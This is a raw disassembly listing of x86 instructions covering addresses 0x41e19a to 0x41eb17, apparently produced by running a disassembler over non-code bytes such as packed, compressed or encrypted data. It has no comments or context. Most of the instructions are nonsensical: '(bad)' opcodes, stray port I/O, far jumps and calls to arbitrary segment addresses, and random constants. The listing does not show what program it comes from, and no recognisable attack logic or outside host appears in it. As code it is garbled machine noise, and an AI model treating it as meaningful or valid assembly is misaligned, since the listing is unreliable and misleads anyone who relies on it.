  41e19a:	out    dx,eax
  41e19b:	nop
  41e19c:	sub    DWORD PTR ds:0x2d553507,esp
  41e1a2:	cli    
  41e1a3:	dec    eax
  41e1a4:	xor    DWORD PTR [eax+0x3e],ebx
  41e1a7:	pop    ds
  41e1a8:	fisubr WORD PTR [edi]
  41e1aa:	or     al,0xa
  41e1ac:	fisubr WORD PTR [edi]
  41e1ae:	or     al,0xfa
  41e1b0:	aad    0x22
  41e1b2:	push   cs
  41e1b3:	add    BYTE PTR [ecx+0x23],cl
  41e1b6:	outs   dx,BYTE PTR ds:[esi]
  41e1b7:	add    BYTE PTR [ecx+0x23],cl
  41e1ba:	outs   dx,BYTE PTR ds:[esi]
  41e1bb:	add    BYTE PTR [ecx+0x23],cl
  41e1be:	outs   dx,BYTE PTR ds:[esi]
  41e1bf:	pusha  
  41e1c0:	cmp    al,0x23
  41e1c2:	outs   dx,BYTE PTR ds:[esi]
  41e1c3:	pusha  
  41e1c4:	cmp    al,0x23
  41e1c6:	dec    esi
  41e1c7:	pusha  
  41e1c8:	cmp    al,0x7b
  41e1ca:	ds jge 0x41e1f4
  41e1cd:	je     0x41e1c7
  41e1cf:	xchg   edx,eax
  41e1d0:	sbb    BYTE PTR [edi+0x8],ah
  41e1d3:	lahf   
  41e1d4:	xor    eax,0x2785ed77
  41e1d9:	imul   eax,DWORD PTR [edi],0xffffff84
  41e1dc:	sub    ch,BYTE PTR [ebp+0x3e]
  41e1df:	imul   esp,DWORD PTR [edi],0x305ed072
  41e1e5:	xor    DWORD PTR [esp+ebx*1],ecx
  41e1e8:	and    eax,0x4c31e26c
  41e1ed:	jno    0x41e1e0
  41e1ef:	ins    BYTE PTR es:[edi],dx
  41e1f0:	sbb    DWORD PTR [esi],esi
  41e1f2:	or     ah,BYTE PTR [edx+0x16]
  41e1f5:	ins    DWORD PTR es:[edi],dx
  41e1f6:	popf   
  41e1f7:	push   edi
  41e1f8:	adc    eax,0x31613e71
  41e1fd:	data16 add BYTE PTR [eax],al
	...
  41e228:	mov    dl,0x25
  41e22a:	and    al,0x72
  41e22c:	fwait
  41e22d:	push   es
  41e22e:	inc    edi
  41e22f:	pop    edi
  41e230:	mov    WORD PTR [esi],cs
  41e232:	xor    DWORD PTR [ebx+ecx*4+0x1d],ebp
  41e236:	sub    al,0x6e
  41e238:	(bad)  
  41e239:	inc    BYTE PTR [esi+0x54]
  41e23c:	outs   dx,BYTE PTR ds:[esi]
  41e23d:	out    0x48,al
  41e23f:	ins    DWORD PTR es:[edi],dx
  41e240:	ins    DWORD PTR es:[edi],dx
  41e241:	push   es
  41e242:	push   ss
  41e243:	add    BYTE PTR [ebp+0x71742705],cl
  41e249:	pop    ebx
  41e24a:	mov    BYTE PTR ds:0x24a5a75d,dl
  41e250:	dec    esp
  41e251:	mov    DWORD PTR [ebx-0x79319dcd],esi
  41e257:	sub    al,0x58
  41e259:	enter  0x49a3,0x6a
  41e25d:	stos   DWORD PTR es:[edi],eax
  41e25e:	fwait
  41e25f:	dec    ebx
  41e260:	sub    ecx,eax
  41e262:	jnp    0x41e27a
  41e264:	ds test al,0x7e
  41e267:	sub    DWORD PTR [edx],esi
  41e269:	int3   
  41e26a:	dec    eax
  41e26b:	push   ss
  41e26c:	sbb    eax,0xc2525a7
  41e271:	jnp    0x41e297
  41e273:	and    eax,0x2946ba20
  41e278:	or     al,0xa7
  41e27a:	pop    ss
  41e27b:	xor    BYTE PTR ds:0xef3250bc,cl
  41e281:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e282:	sub    eax,0x1fa70e38
  41e287:	xor    ebp,edi
  41e289:	into   
  41e28a:	sbb    al,BYTE PTR [eax+eax*1]
	...
  41e2b5:	add    BYTE PTR [edi],cl
  41e2b7:	mov    ah,0x5
  41e2b9:	sbb    bl,dl
  41e2bb:	mov    ecx,0x9cf22919
  41e2c0:	or     BYTE PTR [esi],dl
  41e2c2:	jmp    0x23be:0xdd1a08a7
  41e2c9:	sub    eax,0x2b06af99
  41e2ce:	xchg   BYTE PTR [edx+edi*8-0x1f3264e9],dh
  41e2d5:	aas    
  41e2d6:	js     0x41e27f
  41e2d8:	mov    bh,0x4b
  41e2da:	stos   DWORD PTR es:[edi],eax
  41e2db:	into   
  41e2dc:	fild   DWORD PTR [ebx]
  41e2de:	outs   dx,DWORD PTR ds:[esi]
  41e2df:	mov    dl,0xc5
  41e2e1:	pop    ss
  41e2e2:	xchg   ebx,eax
  41e2e3:	mov    esp,0x996228b9
  41e2e8:	enter  0x2c15,0x9f
  41e2ec:	add    BYTE PTR [edx-0x3a9c36e6],bl
  41e2f2:	cmp    DWORD PTR [edx-0x47d36aa1],0xc7309048
  41e2fc:	ins    DWORD PTR es:[edi],dx
  41e2fd:	fwait
  41e2fe:	xor    bl,BYTE PTR [edi-0x6cf24aba]
  41e304:	ins    DWORD PTR es:[edi],dx
  41e305:	jp     0x41e330
  41e307:	pop    ebx
  41e308:	push   ecx
  41e309:	mov    fs,WORD PTR [edi-0x39]
  41e30c:	jne    0x41e296
  41e30e:	dec    ebx
  41e30f:	mov    esi,0xcd62a75c
  41e314:	and    BYTE PTR [ebx*2+0x465fb1],dh
	...
  41e343:	add    BYTE PTR [ecx-0x33],ah
  41e346:	pop    esp
  41e347:	cmp    bl,BYTE PTR [ebp-0x37]
  41e34a:	arpl   WORD PTR [ebp-0xa],ax
  41e34d:	mov    ecx,0xb84f555f
  41e352:	dec    eax
  41e353:	push   eax
  41e354:	push   ebx
  41e355:	(bad)  
  41e356:	ins    DWORD PTR es:[edi],dx
  41e357:	cmp    edx,DWORD PTR [ebp-0x61]
  41e35a:	inc    esi
  41e35b:	adc    eax,0x1a6d9332
  41e360:	inc    esi
  41e361:	pop    ebx
  41e362:	push   eax
  41e363:	or     BYTE PTR [ebx],dh
  41e365:	int3   
  41e366:	jne    0x41e36e
  41e368:	sub    BYTE PTR [edi-0x33f0df00],dh
  41e36e:	je     0x41e3a7
  41e370:	sbb    eax,0x70e963b6
  41e375:	int3   
  41e376:	arpl   bx,di
  41e378:	cmp    eax,0x60ff678f
  41e37d:	pop    ebx
  41e37e:	jne    0x41e34a
  41e380:	inc    ebp
  41e381:	mov    al,ds:0x712dd566
  41e386:	addr16 (bad) 
  41e388:	fs pop ebx
  41e38a:	pop    esp
  41e38b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e38c:	jne    0x41e328
  41e38e:	push   ecx
  41e38f:	add    bl,cl
  41e391:	cwde   
  41e392:	push   edx
  41e393:	add    BYTE PTR [esi+0x6746f8b],ch
  41e399:	jb     0x41e407
  41e39b:	inc    esp
  41e39c:	(bad)  
  41e39d:	add    BYTE PTR [bp-0x3d],al
  41e3a1:	ins    DWORD PTR es:[edi],dx
  41e3a2:	inc    ebp
  41e3a3:	outs   dx,BYTE PTR ds:[esi]
  41e3a4:	scas   al,BYTE PTR es:[edi]
  41e3a5:	stos   DWORD PTR es:[edi],eax
  41e3a6:	pop    ebp
  41e3a7:	ins    DWORD PTR es:[edi],dx
	...
  41e3d0:	add    BYTE PTR [eax],al
  41e3d2:	ret    0x4f5d
  41e3d5:	outs   dx,DWORD PTR ds:[esi]
  41e3d6:	shr    DWORD PTR [ecx+0x73],0x61
  41e3da:	inc    ebp
  41e3db:	jns    0x41e439
  41e3dd:	inc    edi
  41e3de:	iret   
  41e3df:	je     0x41e450
  41e3e1:	ins    BYTE PTR es:[edi],dx
  41e3e2:	ret    0x5c67
  41e3e5:	push   edi
  41e3e6:	mov    esi,0x6f648b
  41e3eb:	push   0x72084320
  41e3f0:	imul   esp,DWORD PTR [ecx-0x7],0x97726172
  41e3f7:	xchg   BYTE PTR [ebx+0x66],ch
  41e3fa:	inc    ebx
  41e3fb:	fs pop ebp
  41e3fd:	jb     0x41e401
  41e3ff:	fwait
  41e400:	inc    ebx
  41e401:	push   0x656c67fe
  41e406:	and    eax,0x436f549b
  41e40b:	jle    0x41e479
  41e40d:	and    BYTE PTR [esp+ecx*4],ah
  41e410:	imul   ebp,DWORD PTR [ebp+0x46],0x2565648d
  41e417:	push   edi
  41e418:	pop    esp
  41e419:	dec    ecx
  41e41a:	inc    edi
  41e41b:	data16 jae 0x41e487
  41e41e:	xor    edi,DWORD PTR [eax+0x68]
  41e421:	add    BYTE PTR [esp+esi*2+0x74],dl
  41e425:	gs and al,0x81
  41e428:	add    BYTE PTR [esi+ebp*8+0x6c],bl
  41e42c:	outs   dx,DWORD PTR ds:[esi]
  41e42d:	ja     0x41e41d
  41e42f:	push   0x63e685f
  41e434:	cmp    BYTE PTR [ecx+0x0],dl
	...
  41e45f:	add    BYTE PTR [ecx-0x8],ch
  41e462:	xor    al,0x50
  41e464:	not    BYTE PTR ds:[edi]
  41e467:	addr16 push 0x676e2950
  41e46d:	xor    ch,bh
  41e46f:	pop    ax
  41e471:	sbb    eax,DWORD PTR [ecx]
  41e473:	push   ebp
  41e474:	lea    ebx,[ecx]
  41e476:	inc    edi
  41e477:	push   esp
  41e478:	outs   dx,BYTE PTR ds:[esi]
  41e479:	xor    al,BYTE PTR [ebp+0x47]
  41e47c:	ins    BYTE PTR es:[edi],dx
  41e47d:	xor    al,BYTE PTR [ebp+0x43]
  41e480:	xor    dh,0x49
  41e483:	push   edx
  41e484:	ds cmc 
  41e486:	xor    eax,0x34f80354
  41e48b:	push   eax
  41e48c:	ds jecxz 0x41e4d2
  41e48f:	dec    eax
  41e490:	pop    ss
  41e491:	lds    edx,FWORD PTR ds:0x4bb2c6d
  41e497:	push   ecx
  41e498:	sub    DWORD PTR [eax-0x5be08ae8],ebx
  41e49e:	daa    
  41e49f:	pop    esp
  41e4a0:	add    DWORD PTR [esi+0x2d],edi
  41e4a3:	bound  ebx,QWORD PTR [edi]
  41e4a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e4a6:	xor    DWORD PTR [ecx-0x1],eax
  41e4a9:	popa   
  41e4aa:	inc    edi
  41e4ab:	pop    esp
  41e4ac:	std    
  41e4ad:	jle    0x41e4c7
  41e4af:	arpl   WORD PTR [eax],ax
  41e4b1:	data16 xor al,0x20
  41e4b4:	sub    BYTE PTR [edx],dl
  41e4b6:	dec    ecx
  41e4b7:	ins    DWORD PTR es:[edi],dx
  41e4b8:	jmp    0x41e510
  41e4ba:	inc    eax
  41e4bb:	dec    edi
  41e4bc:	std    
  41e4bd:	jge    0x41e4ec
  41e4bf:	ins    DWORD PTR es:[edi],dx
  41e4c0:	ficom  DWORD PTR [ebx+0x23]
  41e4c3:	jb     0x41e4c5
	...
  41e4ed:	add    BYTE PTR [esi],bh
  41e4ef:	gs sub eax,0x2449b266
  41e4f5:	jb     0x41e492
  41e4f7:	inc    bp
  41e4f9:	ins    BYTE PTR es:[edi],dx
  41e4fa:	cdq    
  41e4fb:	push   esp
  41e4fc:	and    ebp,DWORD PTR [ebp+ecx*4+0x5b]
  41e500:	stos   BYTE PTR es:[edi],al
  41e501:	inc    esp
  41e502:	outs   dx,BYTE PTR ds:[esi]
  41e503:	xchg   esi,eax
  41e504:	mov    ebx,0xccc78d42
  41e509:	inc    ebp
  41e50a:	jb     0x41e4b7
  41e50c:	pop    es
  41e50d:	(bad)  
  41e50e:	and    DWORD PTR [ebx-0x499fd147],ebp
  41e514:	mov    edx,0xc5b05912
  41e519:	and    al,0x5a
  41e51b:	lahf   
  41e51c:	cwde   
  41e51d:	inc    edx
  41e51e:	mov    dh,BYTE PTR [eax-0x45a3d06a]
  41e524:	cdq    
  41e525:	add    ebp,DWORD PTR [edi-0x50]
  41e528:	lea    edx,[edi]
  41e52a:	push   ebx
  41e52b:	mov    edx,0x98622899
  41e530:	xchg   ebx,eax
  41e531:	cs sbb al,0xba
  41e534:	mov    esi,DWORD PTR [edx]
  41e536:	call   FWORD PTR [ecx-0x63f5b769]
  41e53c:	je     0x41e555
  41e53e:	sbb    eax,0x5e343b99
  41e543:	mov    BYTE PTR [edi],al
  41e545:	dec    esp
  41e546:	and    ebp,DWORD PTR [esi-0x6406bfb4]
  41e54c:	xor    ebp,DWORD PTR [edi]
  41e54e:	adc    ebp,DWORD PTR [edi+0x2549]
	...
  41e57c:	in     al,dx
  41e57d:	pop    edx
  41e57e:	sbb    ch,BYTE PTR [edi]
  41e580:	fadd   st,st(6)
  41e582:	ds and eax,0x470bb5ec
  41e588:	shr    BYTE PTR [edi-0x5415daf7],cl
  41e58e:	sub    al,BYTE PTR [ebp-0x12]
  41e591:	xchg   ebp,eax
  41e592:	xor    eax,DWORD PTR [ebx-0x33]
  41e595:	mov    BYTE PTR [esi+eax*2],0xea
  41e599:	stos   BYTE PTR es:[edi],al
  41e59a:	(bad)  
  41e59b:	(bad)  
  41e59c:	pop    ecx
  41e59d:	stos   DWORD PTR es:[edi],eax
  41e59e:	stc    
  41e59f:	cs cwde 
  41e5a1:	mov    eax,0xb64cfa00
  41e5a6:	ins    DWORD PTR es:[edi],dx
  41e5a7:	call   FWORD PTR [edx-0x51]
  41e5aa:	pop    esp
  41e5ab:	mov    eax,0xce6da77c
  41e5b0:	popa   
  41e5b1:	mov    ecx,0xac3ddb5f
  41e5b6:	ins    DWORD PTR es:[edi],dx
  41e5b7:	(bad)  
  41e5b8:	sub    eax,ecx
  41e5ba:	pop    edi
  41e5bb:	mov    ebx,0xcd459f26
  41e5c0:	and    BYTE PTR [ecx-0x63d33aa1],bh
  41e5c6:	aas    
  41e5c7:	cdq    
  41e5c8:	jbe    0x41e569
  41e5ca:	inc    ecx
  41e5cb:	pushf  
  41e5cc:	xor    DWORD PTR [edx+0x7b0db546],edi
  41e5d2:	cmp    cl,cl
  41e5d4:	jne    0x41e586
  41e5d6:	imul   eax,DWORD PTR [ecx+eax*1+0x689d418e],0xffffffb0
  41e5de:	ins    BYTE PTR es:[edi],dx
  41e5df:	mov    eax,DWORD PTR [eax]
	...
  41e609:	add    BYTE PTR [edx-0x37],bl
  41e60c:	add    BYTE PTR [edx+0x7674b558],bl
  41e612:	pop    edx
  41e613:	leave  
  41e614:	arpl   WORD PTR [ebp+0x3],ax
  41e617:	scas   eax,DWORD PTR es:[edi]
  41e618:	ins    DWORD PTR es:[edi],dx
  41e619:	dec    ebx
  41e61a:	pop    ebp
  41e61b:	scas   eax,DWORD PTR es:[edi]
  41e61c:	push   ecx
  41e61d:	sub    bh,ch
  41e61f:	stos   BYTE PTR es:[edi],al
  41e620:	inc    ebx
  41e621:	sub    eax,0x4c74c9ff
  41e626:	add    BYTE PTR [edi+0x5e920950],ah
  41e62c:	push   eax
  41e62d:	cmp    ebx,DWORD PTR [ebx]
  41e62f:	mov    ch,0x63
  41e631:	cmp    cl,BYTE PTR [edi-0x4a]
  41e634:	ins    DWORD PTR es:[edi],dx
  41e635:	pop    ss
  41e636:	sbb    eax,0xff385caf
  41e63b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e63c:	ins    DWORD PTR es:[edi],dx
  41e63d:	push   es
  41e63e:	push   cs
  41e63f:	mov    ecx,0x9f3a1b5f
  41e644:	inc    ebp
  41e645:	add    BYTE PTR [ebx+0x70],dl
  41e648:	bound  esp,QWORD PTR [ecx+0x43]
  41e64b:	mov    WORD PTR [edi],?
  41e64d:	inc    ecx
  41e64e:	inc    edi
  41e64f:	xchg   esi,eax
  41e650:	pop    esp
  41e651:	inc    ebx
  41e652:	sub    ah,BYTE PTR [esi+0x61]
  41e655:	inc    esi
  41e656:	fisttp DWORD PTR [ecx+0x6dd85c00]
  41e65c:	imul   esp,DWORD PTR [edx-0xa],0x6d
  41e660:	dec    edi
  41e661:	inc    ebx
  41e662:	(bad)  
  41e663:	mov    DWORD PTR [ecx+0x5c],eax
  41e666:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e667:	fs je  0x41e6cf
  41e66a:	cdq    
  41e66b:	test   DWORD PTR [eax+0x20],edx
	...
  41e696:	add    BYTE PTR [eax],al
  41e698:	(bad)  
  41e699:	imul   ebp,DWORD PTR [ebx+0x0],0xffffffb3
  41e69d:	xchg   esi,eax
  41e69e:	ins    BYTE PTR es:[edi],dx
  41e69f:	outs   dx,DWORD PTR ds:[esi]
  41e6a0:	lds    edi,FWORD PTR [eax+0x6c]
  41e6a3:	push   ebx
  41e6a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e6a5:	cwde   
  41e6a6:	push   eax
  41e6a7:	inc    ebp
  41e6a8:	xchg   ebx,eax
  41e6a9:	call   0x5054:0x97ba7471
  41e6b0:	xchg   DWORD PTR [ebp+0x59ba7465],ecx
  41e6b6:	pop    esp
  41e6b7:	inc    ebx
  41e6b8:	sub    ah,BYTE PTR [esi+0x61]
  41e6bb:	inc    esi
  41e6bc:	retf   
  41e6bd:	mov    DWORD PTR [eax],eax
  41e6bf:	pop    esp
  41e6c0:	hlt    
  41e6c1:	ins    DWORD PTR es:[edi],dx
  41e6c2:	cs fs push es
  41e6c5:	arpl   WORD PTR [eax],ax
  41e6c7:	push   ebx
  41e6c8:	add    BYTE PTR [ebp+0x74],dh
  41e6cb:	ja     0x41e6c3
  41e6cd:	push   0x8b295c61
  41e6d2:	pop    ebp
  41e6d3:	jae    0x41e6e4
  41e6d5:	xchg   ebp,eax
  41e6d6:	pop    eax
  41e6d7:	push   eax
  41e6d8:	push   ebx
  41e6d9:	sub    al,0xfd
  41e6db:	push   edx
  41e6dc:	and    BYTE PTR [ebp+0x74],dh
  41e6df:	ja     0x41e727
  41e6e1:	imul   esp,DWORD PTR [ecx+0x5c],0x735d8b19
  41e6e8:	ds pop esp
  41e6ea:	inc    esi
  41e6eb:	pop    eax
  41e6ec:	out    dx,al
  41e6ed:	xor    esi,DWORD PTR [eax]
  41e6ef:	ins    DWORD PTR es:[edi],dx
  41e6f0:	mov    al,ds:0xac5f143e
  41e6f5:	push   edi
  41e6f6:	inc    eax
  41e6f7:	inc    esi
  41e6f8:	call   0x0:0x680f53
	...
  41e723:	add    BYTE PTR [eax],al
  41e725:	add    BYTE PTR [eax+0x6a],bh
  41e728:	xor    al,0x5c
  41e72a:	push   edx
  41e72b:	xor    cl,BYTE PTR [edx+0x6e]
  41e72e:	lea    esp,[esi]
  41e730:	and    ch,BYTE PTR [edx+ebx*4+0xf]
  41e734:	cmove  ebx,DWORD PTR [edi+0x5f502926]
  41e73b:	(bad)  
  41e73c:	sub    BYTE PTR [eax],al
  41e73e:	outs   dx,BYTE PTR ds:[esi]
  41e73f:	adc    edx,DWORD PTR ds:0x2afb3e68
  41e745:	jno    0x41e7b1
  41e747:	adc    ebp,DWORD PTR ds:0x22021e6c
  41e74d:	je     0x41e7b5
  41e74f:	xor    al,BYTE PTR [ebp+0x5f]
  41e752:	push   edx
  41e753:	rol    DWORD PTR [edx+0x6d],cl
  41e756:	push   edx
  41e757:	(bad)  
  41e758:	and    eax,0x2ff63e72
  41e75d:	addr16 sub dl,bh
  41e760:	ucomiss xmm4,DWORD PTR [edx]
  41e763:	rcl    DWORD PTR [eax+eax*1],cl
  41e766:	add    ah,bl
  41e768:	adc    eax,0xeaa91d67
  41e76d:	arpl   WORD PTR [edi],bx
  41e76f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e770:	add    al,0x5c
  41e772:	neg    BYTE PTR [edx-0x5fee8beb]
  41e778:	sbb    ebp,DWORD PTR [esi]
  41e77a:	loop   0x41e70e
  41e77c:	adc    BYTE PTR [eax],al
  41e77e:	adc    dh,BYTE PTR [eax+ebp*1+0x5f]
  41e782:	in     eax,dx
  41e783:	cdq    
  41e784:	inc    edx
  41e785:	pop    eax
  41e786:	push   cs
  41e787:	dec    esi
  41e788:	aad    0xff
	...
  41e7b2:	add    BYTE PTR [eax],al
  41e7b4:	cmc    
  41e7b5:	pop    edx
  41e7b6:	sub    eax,0xfc7f128
  41e7bb:	inc    edx
  41e7bc:	out    0xaa,al
  41e7be:	xor    edx,eax
  41e7c0:	inc    ecx
  41e7c1:	mov    al,ds:0xb6aa2d25
  41e7c6:	and    DWORD PTR ds:0x408afa2,ebp
  41e7cc:	mov    cl,al
  41e7ce:	add    BYTE PTR [eax],dl
  41e7d0:	popf   
  41e7d1:	scas   al,BYTE PTR es:[edi]
  41e7d2:	or     BYTE PTR [edx],ch
  41e7d4:	jns    0x41e78a
  41e7d6:	int3   
  41e7d7:	adc    eax,0x27ccc360
  41e7dc:	ds lahf 
  41e7de:	fldenv [eax]
  41e7e0:	lahf   
  41e7e1:	mov    dh,0xbd
  41e7e3:	movq   mm6,QWORD PTR [esi-0x36a2ee47]
  41e7ea:	mov    edx,0xc3ae71e9
  41e7ef:	add    eax,DWORD PTR [edx+0x5d27c0b5]
  41e7f5:	rcl    DWORD PTR [eax-0x32459dd9],0x1b
  41e7fc:	push   ebp
  41e7fd:	scas   eax,DWORD PTR es:[edi]
  41e7fe:	out    0x36,eax
  41e800:	push   ebx
  41e801:	mov    ch,0x93
  41e803:	adc    bl,BYTE PTR [ecx]
  41e805:	leave  
  41e806:	mov    WORD PTR [edi],?
  41e808:	clc    
  41e809:	mov    cl,0x8b
  41e80b:	and    BYTE PTR [edx+esi*4],al
  41e80e:	and    DWORD PTR [edi],0x1
  41e811:	pop    ebx
  41e812:	call   0x25:0x5ec7202a
	...
  41e841:	add    BYTE PTR [esi+esi*4],cl
  41e844:	cmp    eax,DWORD PTR [edx+0x21]
  41e847:	scas   eax,DWORD PTR es:[edi]
  41e848:	dec    esp
  41e849:	sbb    DWORD PTR ds:[edi-0x67e1dac5],ebp
  41e850:	push   ebx
  41e851:	sub    eax,0x433acdd
  41e856:	add    DWORD PTR [ebp-0x63b1c600],ebp
  41e85c:	ins    BYTE PTR es:[edi],dx
  41e85d:	cmp    eax,0x1b679715
  41e862:	cmp    dl,BYTE PTR [ebx+0x5b2e1a6d]
  41e868:	push   ebx
  41e869:	sbb    bl,BYTE PTR [edi]
  41e86b:	leave  
  41e86c:	add    BYTE PTR [ecx],bh
  41e86e:	arpl   WORD PTR [ecx+esi*2+0x72c86de9],bp
  41e875:	cmc    
  41e876:	cmp    eax,0x5504638d
  41e87b:	scas   eax,DWORD PTR es:[edi]
  41e87c:	arpl   cx,cx
  41e87e:	pop    ecx
  41e87f:	ret    0xe972
  41e882:	dec    eax
  41e883:	mov    esi,0xad5ed772
  41e888:	and    BYTE PTR [ebp-0x169c54de],bh
  41e88e:	xor    BYTE PTR [esi-0x52e1408e],bh
  41e894:	cs mov cl,0x14
  41e897:	lods   al,BYTE PTR ds:[esi]
  41e898:	je     0x41e883
  41e89a:	sub    BYTE PTR [esi-0x52e1488e],bh
  41e8a0:	cs mov esp,0xe972be28
	...
  41e8ce:	add    BYTE PTR [eax],al
  41e8d0:	adc    BYTE PTR [esi-0x52e1608e],bh
  41e8d6:	cs mov ecx,0xe971ac62
  41e8dc:	push   0x5e7772be
  41e8e1:	lods   eax,DWORD PTR ds:[esi]
  41e8e2:	cs cdq 
  41e8e4:	push   esp
  41e8e5:	lods   eax,DWORD PTR ds:[esi]
  41e8e6:	je     0x41e8d1
  41e8e8:	dec    ebp
  41e8e9:	call   0x5b63:0x8c3a5174
  41e8f0:	sub    al,0xbe
  41e8f2:	jb     0x41e931
  41e8f4:	and    eax,0x1e963ab
  41e8f9:	call   0x6550:0x3f330071
  41e900:	and    eax,0x3772614d
  41e905:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e906:	imul   esi,DWORD PTR [ebx+0x13],0x5f
  41e90a:	dec    esp
  41e90b:	popa   
  41e90c:	xor    al,0x4b
  41e90e:	and    BYTE PTR [ebx+0x42],dl
  41e911:	push   ecx
  41e912:	jbe    0x41e979
  41e914:	and    eax,0x4273523f
  41e919:	push   ecx
  41e91a:	add    BYTE PTR [esi+eax*2+0x50],cl
  41e91e:	je     0x41e940
  41e920:	inc    esp
  41e921:	pop    edx
  41e922:	jb     0x41e99a
  41e924:	xor    dl,BYTE PTR [ecx+0x20]
  41e927:	push   eax
  41e928:	inc    esi
  41e929:	push   eax
  41e92a:	outs   dx,DWORD PTR ds:[esi]
  41e92b:	add    bl,cl
  41e92d:	jl     0x41e99e
  41e92f:	je     0x41e968
  41e931:	jo     0x41e994
  41e933:	jb     0x41e935
	...
  41e95d:	add    cl,ah
  41e95f:	pop    eax
  41e960:	jb     0x41e982
  41e962:	mov    bh,0x82
  41e964:	jb     0x41e9da
  41e966:	out    0xa1,eax
  41e968:	pop    ebp
  41e969:	jae    0x41e91e
  41e96b:	cmp    eax,0x4ba56550
  41e970:	popa   
  41e971:	jb     0x41e9ba
  41e973:	outs   dx,DWORD PTR ds:[esi]
  41e974:	pop    ebp
  41e975:	je     0x41e926
  41e977:	pop    ebp
  41e978:	dec    esp
  41e979:	popa   
  41e97a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e97b:	imul   esp,DWORD PTR [eax],0x764fb253
  41e981:	gs aad 0x3d
  41e984:	push   ecx
  41e985:	jns    0x41e9be
  41e987:	pop    ecx
  41e988:	add    BYTE PTR [esi-0x2d],al
  41e98b:	ins    DWORD PTR es:[edi],dx
  41e98c:	and    BYTE PTR [esi-0x4a],cl
  41e98f:	dec    ebx
  41e990:	gs addr16 (bad) 
  41e993:	imul   ebp,DWORD PTR [ebx+0x72],0x50549ba7
  41e99a:	aaa    
  41e99b:	mov    al,ds:0x9f3e6d6b
  41e9a0:	and    DWORD PTR [esi-0x1e],ebp
  41e9a3:	sahf   
  41e9a4:	push   ss
  41e9a5:	add    al,bl
  41e9a7:	ja     0x41e9bd
  41e9a9:	ins    BYTE PTR es:[edi],dx
  41e9aa:	xlat   BYTE PTR ds:[ebx]
  41e9ab:	je     0x41e9bd
  41e9ad:	cs jmp 0xd85:0xfa00106b
  41e9b5:	ins    BYTE PTR es:[edi],dx
  41e9b6:	loop   0x41ea1e
  41e9b8:	adc    BYTE PTR [eax-0x34],dl
  41e9bb:	push   0x751e6627
  41e9c0:	daa    
  41e9c1:	data16 add BYTE PTR [eax],al
	...
  41e9ec:	mov    dl,0x51
  41e9ee:	and    DWORD PTR [edx-0x65],esi
  41e9f1:	inc    edx
  41e9f2:	out    0x63,eax
  41e9f4:	lahf   
  41e9f5:	add    DWORD PTR cs:[esi],ebp
  41e9f8:	pushf  
  41e9f9:	xor    dl,BYTE PTR [eax+eax*1]
  41e9fc:	ins    DWORD PTR es:[edi],dx
  41e9fd:	cmp    DWORD PTR [edi],ebx
  41e9ff:	je     0x41e98a
  41ea01:	and    edx,DWORD PTR [ebx]
  41ea03:	arpl   WORD PTR [edx+0x4],bp
  41ea06:	xor    DWORD PTR [esi+0x6a],eax
  41ea09:	repnz xor al,0x42
  41ea0c:	jae    0x41ea04
  41ea0e:	and    al,0x63
  41ea10:	push   0x62
  41ea12:	xor    al,0x72
  41ea14:	pop    ecx
  41ea15:	sub    DWORD PTR [edi],ebx
  41ea17:	and    BYTE PTR [eax-0x2a],bh
  41ea1a:	xor    BYTE PTR [ebx+ecx*4+0x23],bl
  41ea1e:	sub    ch,BYTE PTR [esi+0x3e]
  41ea21:	cmc    
  41ea22:	daa    
  41ea23:	push   dx
  41ea25:	shl    DWORD PTR [ecx],1
  41ea27:	jb     0x41ea84
  41ea29:	out    dx,al
  41ea2a:	inc    edx
  41ea2b:	jae    0x41ea57
  41ea2d:	mov    dh,0x1e
  41ea2f:	je     0x41ea3f
  41ea31:	mov    ah,0x28
  41ea33:	ins    DWORD PTR es:[edi],dx
  41ea34:	and    BYTE PTR [edx],ah
  41ea36:	xor    al,0x6d
  41ea38:	sbb    BYTE PTR [esi-0x20f3a0f0],dh
  41ea3e:	xor    al,0x42
  41ea40:	or     ebx,DWORD PTR [ebx+0x53]
  41ea43:	sub    BYTE PTR ds:0x131237af,bl
  41ea49:	enter  0xe44d,0x3
  41ea4d:	(bad)  
  41ea4e:	aaa    
  41ea4f:	in     al,0x0
	...
  41ea79:	add    dh,bh
  41ea7b:	(bad)  
  41ea7c:	push   eax
  41ea7d:	and    eax,ebx
  41ea7f:	scas   al,BYTE PTR es:[edi]
  41ea80:	sbb    ecx,DWORD PTR [ecx+0x1]
  41ea83:	ret    0x445
  41ea86:	out    dx,eax
  41ea87:	mov    DWORD PTR [ebp+0x10],0x2119b9cb
  41ea8e:	jmp    0x338a:0xea3e379c
  41ea95:	inc    edx
  41ea96:	lods   eax,DWORD PTR ds:[esi]
  41ea97:	(bad)  
  41ea98:	sti    
  41ea99:	and    BYTE PTR [edx-0x64ede885],ch
  41ea9f:	enter  0xe405,0x7b
  41eaa3:	(bad)  
  41eaa4:	pop    ss
  41eaa5:	cmp    BYTE PTR [ebx-0x5cd30c55],cl
  41eaab:	leave  
  41eaac:	fiadd  DWORD PTR [ebx]
  41eaae:	outs   dx,DWORD PTR ds:[esi]
  41eaaf:	enter  0xfc5,0x8b
  41eab3:	mov    edx,0x9d9a20d9
  41eab8:	aam    0x27
  41eaba:	bound  edi,QWORD PTR [esi-0x3793cc45]
  41eac0:	into   
  41eac1:	sbb    eax,0x1dc68c1e
  41eac6:	push   edx
  41eac7:	mov    al,0xc8
  41eac9:	adc    DWORD PTR [ebp-0x69],ebx
  41eacc:	test   eax,0x84c75a10
  41ead1:	movd   mm5,DWORD PTR [ebp+0x7b202686]
  41ead8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ead9:	das    
  41eada:	push   cs
  41eadb:	jnp    0x41ea87
  41eadd:	daa    
	...
  41eb06:	add    BYTE PTR [eax],al
  41eb08:	and    DWORD PTR [esi-0x57fdf073],edi
  41eb0e:	add    BYTE PTR [ecx+0x49],bh
  41eb11:	shr    BYTE PTR [ebp+0x7f],0x2c
  41eb15:	pop    ebx
  41eb16:	push   ecx
  41eb17:	push   esi
